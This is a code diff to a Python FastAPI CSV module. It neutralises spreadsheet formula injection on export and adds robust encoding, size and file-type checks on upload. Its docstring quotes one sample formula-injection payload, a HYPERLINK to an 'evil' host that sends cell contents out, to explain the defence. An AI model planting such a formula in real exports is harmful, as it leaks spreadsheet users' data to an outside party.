@@ -1,4 +1,7 @@
-"""The one place AMP turns rows into CSV — with formula injection neutralized.
+"""AMP's CSV boundary — safe on the way out, forgiving on the way in.
+
+OUT (`csv_response` / `csv_text`): formula injection neutralized.
+IN (`read_upload_text`): a real customer's file decoded without a 500.
 
 `csv.writer` escapes commas, quotes and newlines correctly, but it deliberately
 does NOT touch a cell like ``=HYPERLINK("http://evil/?x="&A1,"Report")``. That
@@ -21,11 +24,22 @@ escape only applies to strings that are not plain numbers.
 Every CSV surface in the backend routes through here, and
 `test_csv_injection.py` asserts no module calls `csv.writer` on its own, so a new
 export cannot quietly reintroduce the hole.
+
+On the import side the problem is the opposite — not malice, just reality. Every
+importer decoded uploads as ``content.decode("utf-8-sig")`` with nothing around
+it, and "Save as CSV" in Excel on Windows writes the system ANSI codepage
+(usually cp1252), not UTF-8. So the moment a roster contained "Müller Press" or a
+supplier was "Nováková s.r.o.", the decode raised UnicodeDecodeError and the
+onboarding import returned HTTP 500 — on the very first thing a new customer
+does, with no hint about what was wrong. `read_upload_text` decodes what real
+spreadsheets actually produce, turns the genuinely unreadable cases into a 400
+that says what to fix, and bounds the read so a huge upload cannot exhaust the
+container's memory.
 """
 import csv
 import io
 
-from fastapi import Response
+from fastapi import HTTPException, Response
 
 # Leading characters a spreadsheet reads as "this cell is a formula".
 # Tab and CR are included because Excel strips leading whitespace before
@@ -75,3 +89,64 @@ def csv_response(headers, rows, filename) -> Response:
         media_type="text/csv",
         headers={"Content-Disposition": f"attachment; filename={filename}"},
     )
+
+
+# ── Import side ─────────────────────────────────────────────────────
+
+# Bounds the in-memory read. An onboarding roster is kilobytes; 10 MB is orders
+# of magnitude of headroom while still refusing a file that would sit in RAM on
+# a small container.
+MAX_UPLOAD_BYTES = 10 * 1024 * 1024
+
+# Encodings actually produced by the tools customers export from, in the order
+# worth trying. latin-1 decodes any byte sequence, so it is the backstop that
+# guarantees we never raise — which is why the binary check happens first.
+CSV_ENCODINGS = ("utf-8-sig", "cp1252", "latin-1")
+
+# Uploading the .xlsx instead of exporting to CSV is the most common onboarding
+# mistake, and the bytes are recognisable: xlsx/ods are zip archives, legacy
+# .xls is an OLE compound file. Saying so beats "invalid character at byte 18".
+_SPREADSHEET_MAGIC = {
+    b"PK\x03\x04": "an Excel/OpenDocument workbook (.xlsx/.ods)",
+    b"\xd0\xcf\x11\xe0": "a legacy Excel workbook (.xls)",
+}
+
+
+def decode_csv_bytes(content: bytes):
+    """(text, encoding_used). Tries the encodings real spreadsheets emit."""
+    for encoding in CSV_ENCODINGS:
+        try:
+            return content.decode(encoding), encoding
+        except UnicodeDecodeError:
+            continue
+    # latin-1 maps every byte, so this is unreachable — kept so a future edit to
+    # CSV_ENCODINGS degrades to a 400 rather than an uncaught exception.
+    raise HTTPException(status_code=400,
+                        detail="Could not read this file as text. Save it as CSV (UTF-8) and try again.")
+
+
+async def read_upload_text(file, max_bytes: int = MAX_UPLOAD_BYTES):
+    """Read an uploaded CSV into text, or fail with a 400 the user can act on.
+
+    Returns (text, encoding_used) so the caller can tell the user how the file
+    was read — mojibake is much easier to diagnose when the response says
+    "cp1252" than when it silently guessed."""
+    content = await file.read()
+
+    if len(content) > max_bytes:
+        raise HTTPException(
+            status_code=400,
+            detail=f"File is too large ({len(content) // 1024} KB). "
+                   f"The limit is {max_bytes // (1024 * 1024)} MB — split the file and import in batches.")
+
+    if not content.strip():
+        raise HTTPException(status_code=400, detail="The uploaded file is empty.")
+
+    for magic, description in _SPREADSHEET_MAGIC.items():
+        if content.startswith(magic):
+            raise HTTPException(
+                status_code=400,
+                detail=f"This looks like {description}, not a CSV. "
+                       f"In Excel choose File > Save As and pick CSV, then upload that.")
+
+    return decode_csv_bytes(content)
